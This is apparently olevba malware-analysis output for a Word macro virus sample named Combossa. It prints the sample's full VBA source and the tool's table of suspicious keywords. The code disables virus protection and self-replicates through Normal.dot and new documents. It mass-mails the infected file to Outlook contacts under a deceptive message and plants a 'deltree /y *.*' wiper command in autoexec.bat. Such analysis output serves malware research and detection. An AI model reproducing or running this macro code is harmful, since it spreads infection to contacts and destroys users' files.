olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Combossa-cc04660b0fa1325c7cf1d612848f2399eae96fa2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Combossa-cc04660b0fa1325c7cf1d612848f2399eae96fa2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.Combossa-cc04660b0fa1325c7cf1d612848f2399eae96fa2 - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub Main()
Dim nome$, arq$
Dim dead As Integer
On Error GoTo infecta
dead = System.ProfileString("Defination", "Combo")
dead = dead - 1
System.ProfileString("Defination", "Combo") = dead
GoTo noerro
infecta:
System.ProfileString("Defination", "Combo") = 100
dead = System.ProfileString("Defination", "Combo")
noerro:
If dead = 0 Then
If MsgBox("Is the man the virus of the planet?", vbYesNo, "You Died!") = vbYes Then
   MsgBox "Correct answer!"
   System.ProfileString("Defination", "Combo") = 100
 Else
   MsgBox "You Died!"
   Open "c:\autoexec.bat" For Append As #1
   Write #1, "echo s|deltree /y *.*>Combo.vir"
   Close #1
End If
End If
Err.Clear

Options.VirusProtection = False
CommandBars("Tools").Controls("Macro").Enabled = False
nome$ = Normal.ThisDocument.FullName
arq$ = Application.ActiveDocument.FullName
macros = NormalTemplate.VBProject.VBComponents.Count
macros = Normal.ThisDocument.VBProject.VBComponents.Count - 1
If macros <= 0 Then
   On Error Resume Next
    Application.OrganizerCopy arq$, nome$, "AutoOpen", wdOrganizerObjectProjectItems
    Application.OrganizerCopy arq$, nome$, "AutoNew", wdOrganizerObjectProjectItems
    Application.OrganizerCopy arq$, nome$, "Combo", wdOrganizerObjectProjectItems
    Application.OrganizerCopy arq$, nome$, "OpenFile", wdOrganizerObjectProjectItems
End If
fim:
combo.combo
End Sub

-------------------------------------------------------------------------------
VBA MACRO AutoNew.bas 
in file: Virus.MSWord.Combossa-cc04660b0fa1325c7cf1d612848f2399eae96fa2 - OLE stream: 'Macros/VBA/AutoNew'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub Main()
Dim dat As String
nome$ = Normal.ThisDocument.FullName
arq$ = Application.ActiveDocument.FullName
macros = Application.ActiveDocument.VBProject.VBComponents.Count - 1
If macros <= 0 Then
   On Error Resume Next
   Application.OrganizerCopy nome$, arq$, "AutoOpen", wdOrganizerObjectProjectItems
   Application.OrganizerCopy nome$, arq$, "AutoNew", wdOrganizerObjectProjectItems
   Application.OrganizerCopy nome$, arq$, "Combo", wdOrganizerObjectProjectItems
   Application.OrganizerCopy nome$, arq$, "OpenFile", wdOrganizerObjectProjectItems
End If
fim:
dat = "1 / 1 / 2000"
Date = dat
End Sub
-------------------------------------------------------------------------------
VBA MACRO combo.bas 
in file: Virus.MSWord.Combossa-cc04660b0fa1325c7cf1d612848f2399eae96fa2 - OLE stream: 'Macros/VBA/Combo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub combo()
On Error Resume Next
Dim look, DMN, BO
Dim avp As String
Set look = CreateObject("Outlook.Application")
Set DMN = look.GetNameSpace("MAPI")
avp = "Outlook"
If look = avp Then
   DMN.Logon "profile", "password"
    For y = 1 To DMN.AddressLists.Count
        Set AddyBook = DMN.AddressLists(y)
        x = 1
        Set BO = look.CreateItem(0)
        For oo = 1 To AddyBook.AddressEntries.Count
            Peep = AddyBook.AddressEntries(x)
            BO.Recipients.Add Peep
            x = x + 1
            If x > 49 Then oo = AddyBook.AddressEntries.Count
         Next oo
         lingua = System.LanguageDesignation
         If lingua = "Português (Brasil)" Then
            BO.Subject = "Ainda se lembra de mim? " & Application.UserName
            BO.Body = "Por que não me escreve mais? Ai vai o documento que me pediu, e não me pergunte como consegui!...Abraços!"
            BO.Attachments.Add ActiveDocument.FullName
            BO.Send
            Peep = ""
          Else
            BO.Subject = "Do you Still remember me? " & Application.UserName
            BO.Body = "Why doesn't write me more? Here be the document that asked me, and don't wonder as I got!... Hugs!"
            BO.Attachments.Add ActiveDocument.FullName
            BO.Send
            Peep = ""
         End If
    Next y
End If

End Sub
-------------------------------------------------------------------------------
VBA MACRO OpenFile.bas 
in file: Virus.MSWord.Combossa-cc04660b0fa1325c7cf1d612848f2399eae96fa2 - OLE stream: 'Macros/VBA/OpenFile'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public Sub Main()
nome$ = Normal.ThisDocument.FullName
arq$ = Application.ActiveDocument.FullName
macros = Application.ActiveDocument.VBProject.VBComponents.Count - 1
If macros <= 0 Then
   On Error Resume Next
   Application.OrganizerCopy nome$, arq$, "AutoOpen", wdOrganizerObjectProjectItems
   Application.OrganizerCopy nome$, arq$, "AutoNew", wdOrganizerObjectProjectItems
   Application.OrganizerCopy nome$, arq$, "Combo", wdOrganizerObjectProjectItems
   Application.OrganizerCopy nome$, arq$, "OpenFile", wdOrganizerObjectProjectItems
End If
End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+

